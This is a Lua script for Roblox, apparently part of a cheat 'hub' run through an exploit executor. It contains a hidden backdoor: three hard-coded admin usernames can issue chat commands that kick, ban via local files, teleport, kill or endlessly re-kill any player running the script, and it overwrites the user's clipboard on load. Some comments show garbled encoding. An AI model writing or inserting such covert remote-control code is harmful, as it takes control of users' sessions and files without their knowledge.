
setclipboard("asf.69")

local TextChatService = game:GetService("TextChatService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer

local admins = { Davi1901lucas = true, Lusquinha_067 = true, gokuooo99 = true }
local loopKills = {}

local function isAdmin(user)
    return admins[user]
end

local function findClosestPlayer(namePart)
    namePart = namePart:lower()
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr.Name:lower():find(namePart, 1, true) then
            return plr
        end
    end
end

TextChatService.MessageReceived:Connect(function(message)
    local sender = Players:GetPlayerByUserId(message.TextSource.UserId)
    if not sender or not isAdmin(sender.Name) then return end

    local msg = message.Text
    local cmd, targetName, reason = msg:match("^(%S+)%s*(%S+)%s*(.*)$")
    local target = findClosestPlayer(targetName)

    if cmd == "/kick" or cmd == "/band" or cmd == "/banc" then
        if not target then return end
        reason = reason ~= "" and reason or "No reason provided"

        if cmd == "/band" then 
            writefile("KamuiHubBan.txt", string.format('true, "%s", "%s"', sender.Name, reason))
            if target == player then 
                player:Kick("You're blacklisted in the hub (Device Ban). Banned by: " .. sender.Name .. ". Reason: " .. reason)
            end
        elseif cmd == "/banc" then
            local fileName = "ban_" .. target.UserId .. ".txt"
            writefile(fileName, string.format('true, "%s", "%s"', sender.Name, reason))
            if target == player then 
                player:Kick("You're blacklisted in the hub (Account Ban). Banned by: " .. sender.Name .. ". Reason: " .. reason)
            end
        elseif cmd == "/kick" then
            if target == player then 
                player:Kick("You've been kicked from the game by the hub. Kicked by: " .. sender.Name .. ". Reason: " .. reason)
            end
        end
    elseif cmd == "/bring" and sender.Character and player.Character then
        player.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
        task.wait(.1)
        player.Character:SetPrimaryPartCFrame(sender.Character:GetPrimaryPartCFrame())
    elseif cmd == "/spy" then
        player.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
        task.wait(.1)
        player.Character:SetPrimaryPartCFrame(CFrame.new(1118.81, 75.998, -1138.61))
    elseif cmd == "/kill" and target then
        if target == player and target.Character and target.Character:FindFirstChild("Humanoid") then
            target.Character.Humanoid.Health = 0
        end
    elseif cmd == "/loopkill" and target then
        if target == player then
            loopKills[player.UserId] = true  -- Ativa o loopkill
            
            -- Mata o jogador imediatamente se ele jÃÂ¡ estiver vivo
            if target.Character and target.Character:FindFirstChild("Humanoid") then
                target.Character.Humanoid.Health = 0
            end

            -- Mata o jogador sempre que ele renascer
            target.CharacterAdded:Connect(function(char)
                if loopKills[player.UserId] then
                    task.wait(.2)
                    local humanoid = char:WaitForChild("Humanoid")  -- Aguarda o Humanoid carregar
                    humanoid.Health = 0
                end
            end)
        end
    elseif cmd == "/unloopkill" and target then
        loopKills[target.UserId] = nil  -- Desativa o loopkill
    end
end)

-- Verifica se o jogador estÃÂ¡ banido pelo dispositivo
if isfile("KamuiHubBan.txt") then
    local data = readfile("KamuiHubBan.txt")
    local status, adminName, reason = data:match('^(true),%s*"(.-)",%s*"(.-)"$')
    if status == "true" then
        player:Kick("You're blacklisted in the hub (Device Ban). Banned by: " .. (adminName or "Unknown") .. ". Reason: " .. (reason or "No reason provided"))
    end
end

-- Verifica se o jogador estÃÂ¡ banido pela conta
local fileName = "ban_" .. player.UserId .. ".txt"
if isfile(fileName) then
    local data = readfile(fileName)
    local status, adminName, reason = data:match('^(true),%s*"(.-)",%s*"(.-)"$')
    if status == "true" then
        player:Kick("You're blacklisted in the hub (Account Ban). Banned by: " .. (adminName or "Unknown") .. ". Reason: " .. (reason or "No reason provided"))
    end
end

if isAdmin(player.Name) then
    player.Chatted:Connect(function(msg)
        if msg == "/spy" then
            player.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
            task.wait(.1)
            player.Character:SetPrimaryPartCFrame(CFrame.new(1118.81, 75.998, -1138.61))
        end
    end)
end

